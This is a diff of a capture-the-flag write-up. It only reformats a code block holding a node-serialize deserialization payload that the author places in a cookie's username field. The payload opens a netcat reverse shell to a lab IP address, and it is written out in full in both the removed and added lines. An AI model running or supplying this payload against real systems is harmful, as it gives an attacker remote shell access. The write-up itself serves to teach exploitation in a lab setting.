@@ -38,7 +38,9 @@ However,changing the cookie value to anything else shows us errors
 So we decide to put a reverse shell in the Username field, which gives us access to the machine .
 
 ```py
-{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.9.8.34 1337 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}
+{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 
+2>&1|nc 10.9.8.34 1337 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })",
+"isGuest":true,"encoding": "utf-8"}
 ```
 ![](/images/MaskdMafia/node-4.png)
 
